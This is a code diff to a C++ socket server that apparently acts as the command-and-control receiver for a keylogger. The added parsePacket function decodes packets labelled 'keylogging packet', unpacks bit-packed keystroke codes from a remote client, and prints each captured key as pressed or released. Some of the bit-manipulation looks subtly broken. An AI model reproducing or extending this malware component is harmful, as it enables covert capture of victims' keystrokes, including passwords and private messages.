@@ -7,6 +7,8 @@
 #include <vector>
 #ifdef _WIN32
 #include <winsock2.h>
+#include <Windows.h>
+#include <winuser.h>
 #include <ws2tcpip.h>
 #endif
 #define PORT 50000 
@@ -45,7 +47,55 @@ bool checkLocalAddress(sockaddr_in inAddr) {
     return false;
 }
 void parsePacket(char * buffer, int numBits){
+    if(numBits < 1)return;
+    uint8_t header = buffer[0];
+    int type = (header & (0b11<<6)) >>6;
+    if(type ==0){
+        std::cout<<"keylogging packet"<<std::endl;
+        int numKeystrokes = (header & (0b1111<<2))>>2;
 
+        std::cout<<"num keystrokes"<<numKeystrokes<<std::endl;
+        int operatingSystem = (header &(0b10)>>1);
+        std::cout<<"operating system"<<operatingSystem<<std::endl;
+        int currentbitIndex = 0;
+        
+        std::vector<uint16_t> keystrokes(numKeystrokes);
+        for(int i =1; i <= numKeystrokes; i++){
+
+            char currentByte =  buffer[i];
+            
+            uint16_t keystroke = (((0b1 <<(8-currentbitIndex))-1) & currentByte)<<(1+currentbitIndex);
+            keystroke = keystroke | ((buffer[i+1] & (((0b1 <<(1+currentbitIndex))-1)<<(7-currentbitIndex))) >>(7-currentbitIndex));
+            keystrokes[i-1] = keystroke;
+            currentbitIndex++;
+
+        }
+        BYTE keyboardState[256];
+
+        if (!GetKeyboardState(keyboardState)) {
+            return;
+        }
+        WORD asciiValue;
+
+        for(int j = 0; j < numKeystrokes; j++){
+            uint16_t keystroke = keystrokes[j];
+            
+            // std::bitset<16> binary(keystroke);
+            // std::cout<<binary<<std::endl;
+            
+            BYTE keyCode = keystroke & 0xFF;
+        
+            int result = ToAscii(keyCode, MapVirtualKey(keyCode, MAPVK_VK_TO_VSC), keyboardState, &asciiValue, 0);
+            // std::cout<<static_cast<int>(keystroke &(0b1<<8))<<std::endl;
+            if(((keystroke & (0b1<<8))>>8) != 0){
+                
+                std::cout<<"key pressed "<<static_cast<char>(asciiValue)<<std::endl;
+            }else{
+                std::cout<<"key released "<<static_cast<char>(asciiValue)<<std::endl;
+            }
+        }
+
+    }
     
 
     
@@ -67,6 +117,7 @@ void handleRequest(SOCKET clientFD, sockaddr_in clientAddr) {
 
         buffer[n] = '\0';
         std::string clientMessage(buffer);
+        parsePacket(buffer,n);
 
         std::cout << "Received: " << clientMessage << std::endl;
         std::cout << "Binary form of the message:\n";
